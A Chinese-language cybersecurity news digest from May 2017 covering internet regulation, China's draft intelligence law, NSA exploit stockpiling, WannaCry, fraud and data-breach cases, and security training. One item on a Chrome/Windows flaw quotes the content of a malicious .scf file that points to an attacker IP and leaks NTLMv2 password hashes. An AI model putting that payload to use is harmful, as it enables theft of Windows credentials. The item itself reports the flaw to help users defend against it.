政府举措

英国保守党在竞选声明中表示将规范英国互联网

英国保守党在其竞选声明的末尾暗示了新政策会影响英国互联网环境。如果特雷莎·梅在下个月赢得选举，那么保守党将大范围得扩大互联网的管理并做到无论是在互联网上还是在实际生活中都保护公民的安全。竞选声明中包含了许多针对互联网管理的规章条例，帮助虚拟经济的发展。条例还保护网民免受网络暴力，并允许未成年人完全清除其在网上发布的信息。声明表示这些规章的初衷是我们认为互联网和实际生活的管理都应该归于同个管理者。

![](../Images/2993cb1213876c97185023680a1580a6.png)

保守党还会进一步推进规章的实施，使管理者有权强制互联网公司遵守相关的规定。除此之外，相关的制度还会集中在新闻的真实性和信息的客观性上。（来源：cnBeta .com）

  

中华人民共和国国家情报法（草案）全文公开征求意见

全国人大常委会5月16日在中国人大网官网公布《中华人民共和国国家情报法（草案）》全文，公开征求意见，意见截止日期为2017年6月4日。草案全文共计五章28个条文，主要内容是明确了国家情报工作的任务和体制机制，明确了国家情报工作机构的职权，明确了国家情报工作保障，明确对国家情报工作的规范和监督。

草案声明中写道：“国家情报工作应该为维护国家安全和保护国家利益提供支持。”不过，其中没有就该法的具体通过时间做出说明。草案中提及的国家利益，包括国家政权、主权、独立以及领土完整。（来源：中国人大网）

美国国会议案设法阻止 NSA 秘密储存网络武器

国国家安全局（ NSA ）武器库于上周遭神秘黑客组织 “影子经纪人” 在线曝光，WannaCry 勒索软件肆意蔓延，致使全球各企业机构造成严重损失。

尽管 NSA 一再声称，发现、保留并私藏漏洞的主要目的是为了捍卫国家网络安全，但前美国中央情报局（ CIA ）技术分析员斯诺登却直言，NSA 发现、利用、甚至在某些特殊情况下购买的漏洞多数用于政府监听与情报收集，只有极少部分用于维护自身网络安全。

![](../Images/d845269c57078bbc83f6e660f56247c1.png)

为有效避免此类事件再次发生，美国两党议员趁热打铁于本月 17 日提出一项议案，迫使 NSA 将武器库转交至新审查委员会以确定哪些重大漏洞应尽快得到修复。

目前，该议案虽然得到广大公民及全球各知名企业的支持，但具体规则却受到 “ Vulnerabilities Equities Process ” （ VEP ）约束，因 VEP 进程决定是否应该将漏洞用于网络间谍活动或公开披露。此外，立法委员会表示，虽然 VEP 尚未处于公开状态，但目前可通过监督来确保该议案的透明度与问责制。（来源：HackerNews.cc）

  

澳门将设网络安全预警中心以统一防范体系

中国澳门特区政府保安司司长黄少泽17日表示，特区政府由2015年开始已就设立网络安全中心进行研究，以更好地统一全澳网络安全的防范体系，保安司去年年底已完成网络安全法案并提交予行政会，将设立一个网络安全预警中心。

![](../Images/1d79c2fa20401a8e4c475d409572df30.png)

根据法案的初步设计，包括几方面的措施，其中最重要是设立一个网络安全预警中心，由行政公职局、邮电局及司警局等3个部门组成，各有分工。预警中心将包括决策机构、执行机构及咨询机构，当发现有网络风险情况会实时向社会发布，同时对关键基础设施网络安全进行防范。（来源：新华网）

  

网络安全事件

浙江特大网络诈骗案告破 涉案金额达 2.2 亿元

**央视新闻报道，浙江温岭警方经过 3 个月侦查，摧毁了以指导投资为名进行诈骗的特大网络诈骗团伙，该团伙涉案资金约 2.2 亿元。**

今年 2 月，浙江温岭警方接到瞿先生报案称，被人以提供金融交易指导为由骗走了 158 万元。专案组民警通过对 1000 多个 QQ 账号中，发现了一个账户名为赵某的可疑账号。经查，犯罪嫌疑人赵某是贵阳一家金融投资公司的股东。

![](../Images/f82173ad07e705c21e08e8f1f21ec05e.png)

公安机关在审讯中发现，该犯罪团伙采用公司化运作模式，组织严密、分工明确，以高额资金回报为诱饵，诱导受害人参与虚假原油、黄金等期货交易，进行诈骗。目前初步查明，本案受害人 600 余人，涉及全国多个省市，涉案金额约 2.2 亿元，案件正在进一步审查中。（来源： cnBeta .com）

  

官媒认为美国应该对勒索软件攻击承担部分责任

勒索软件 WannaCry 上周末席卷全球，其中中国是**重灾区。**导致这一结果的一个原因被认为是**中国对盗版软件的依赖，**以及系统没有及时安装更新缺乏安全意识。中国官媒认为，美国应该对勒索软件攻击承担部分责任。中国日报称，解决网络罪犯的共同努力受阻于美国政府的行动，在网络攻击之后，没有确凿证据支持对中国科技公司如华为的禁令。

![](../Images/16085d4e5614116e703922423572c113.png)

WannaCry 利用了 Shadowbrokers 泄漏的 NSA 漏洞利用代码 EternalBlue，过去几天 EternalBlue 或它的中文名永恒之蓝在中国可能比 WannaCry 这个词更流行。在 WannaCry 流行之际，中国正准备实施受争议的网络安全法。（来源：奇客solidot.org）

  

[谷歌Chrome小组正在修复Windows系统上的浏览器凭证窃取问题](http://mp.weixin.qq.com/s?__biz=MzI1OTA1MzQzNA==&mid=2651212353&idx=1&sn=e277c937c817606ce41b471553bb0755&chksm=f18c2854c6fba142378efcddf9bc5695db1c526d441da1fe307c0843c4789641db3061f23c6d&scene=21#wechat_redirect)

近日，安全工程师Stankovic披露，攻击者利用Windows及Chrome的安全漏洞将能够窃取Windows用户的凭证。谷歌Chrome小组正对此进行紧急修复。用户在使用Chrome浏览器时，如果被诱导下载了某个.scf类型的文件，其内容为\[Shell\]IconFile=\\\\170.170.170.170\\icon。那么攻击者的电脑上就可以接收到用户ID和NTLMv2散列后的密码。用户在等待谷歌的修复方案的同时，也可以提高安全防护的等级，并将Chrome下载设置为“当进行下载时需要询问我”，这样可以在下载文件时查看其后缀名是否是.scf。

![](../Images/139c426862ca320c912aac4cb2c57ec1.png)

此外，除了Chrome之外，不论是IE、Edge、Firefox或Safari等浏览器都不会在未提醒使用者的状况下直接下载SCF文件，该漏洞影响所有的Windows版本以及最新的Chrome浏览器。（来源：网易新闻）

  

加拿大贝尔190 万个电子邮件地址遭窃

** 加拿大电信巨头加拿大贝尔（ Bell Canada）于 17 日对外披露一起大规模数据泄露事件，公司承认黑客入侵其系统并窃取 190 万个用户电子邮件地址及约 1700 个用户姓名和活跃电话号码信息。**

加拿大贝尔表示，并没有迹象表明用户的财务信息已被访问。此外，密码和其他敏感数据也是安全的。 虽然黑客窃取的信息不完整，但用户仍然面临风险。更具体地说，黑客可能会向这些用户发送钓鱼邮件。

![](../Images/faeef395ec83f00600e94807199a4cfa.png)

公司发表声明，指出他们不会通过电子邮件向用户询问信用卡或其他个人信息。希望用户小心那些要求提供个人信息的网站，避免点击链接或从未知来源的电子邮件中下载附件。 此外，加拿大贝尔还建议用户最好修改密码及安全问题。（来源：cnBeta）

  

印度Zomato数据泄露，近1700万用户名和哈希密码被窃

印度最大的餐厅与食品外送应用Zomato周四宣布，黑客已经窃取了约1700万用户的数据，包括用户姓名、邮箱地址和哈希密码。Zomato强调其哈希密码很难破解，但仍建议用户修改密码。公司CTO表示用户信用卡等支付相关信息是安全的，因为它是单独存储的，并没有收到本次事件的影响。国外媒体报道称，这些个人数据正在暗网出售，售价约1000美元。Zomato方面怀疑本次数据泄露是内鬼所为。（来源：freebuf.com）

人才培养

中国信息安全测评中心与高校联手打造网络空间安全创新基地

2017年5月18日，由东莞理工学院与中国信息安全测评中心联合举办的，网络空间安全产教融合人才培养高峰论坛暨《网络空间安全创新基地战略合作》签约仪式，在东莞举行。通过本次合作，共同努力提高教育行业的信息安全理论及实践水平，为国家网信事业发展输送更多的人才，并通过长期的积累，助力缓解我国网络安全人才存在的数量缺口较大、能力素质不高、结构不尽合理等问题，共同助力维护国家网络安全、建设网络强国的目标。

![](../Images/2bbff454f0272481d673a0bcea758c57.png)

东莞理工学院副校长马宏伟、计算机学院院长袁华强在接受采访时指出，希望通过合作，共同整合优化资源，超越传统教育的培养模式，探索网络安全人才选拔和创新人才培养全新模式，全力打造网络安全人才培养高地，为在新型工业化背景下的“新工科”建设，提供创新合作的样板。（来源：中国日报）

  

首届“蓝帽杯”全国大学生网络安全技能大赛在公安大学举办

5月21日，首届“蓝帽杯”全国大学生网络安全技能大赛在中国人民公安大学落下帷幕，来自全国22所高校117名选手组成的39支代表队，经过一天激烈的网上攻防，分别摘得一、二、三等奖。

中国人民公安大学党委副书记、校长曹诗权在致辞中指出，网络威胁无处不在，网络安全形势严峻，网络安全保卫战是一场持续的、以技能为主导的战争，培养靠得住、本领强、打得赢的网络安全专业人才，是维护我国国家安全和发展利益的重大课题。曹诗权希望大赛成为增强网络安全意识、提高网络安全技能的实践教材，努力培养新时期适应公安网络安全实战需求的专业人才。

陈延超代表公安部人事训练局对大赛的举办表示祝贺，希望希望全体参赛选手，一是要紧围绕当今网络安全保卫现实需求，培养实战型专门人才；二是要紧跟“互联网+”时代网络信息技术发展新形势，锻造过硬专业素质；三是要珍惜难得的实践机遇，营造互学互鉴的良好氛围。（来源：中国青年网）

  

漏洞速递

几乎所有的 WannaCry 受害者运行的是 Windows 7

**根据卡巴斯基实验室通过其 Twitter 账号公布的数据，几乎所有的 WannaCry 受害者运行的是 Windows 7。**

不同版本的 Windows 7 占到总感染系统的接近 98%， Windows XP 和 Windows 10 比例不到千分之一，其余主要是 Windows 2008 R2 Server。

![](../Images/944db74f8eaf13ef391ced173eb1011e.png)

Windows 7 是市场占有率最高的桌面操作系统，但其感染率显然不成比例的高。已经停止支持的 XP 并没有以前认为的那么令人担忧，微软是在勒索软件开始广泛传播之后紧急为 XP 释出了免费修复补丁。（来源：solidot奇客）
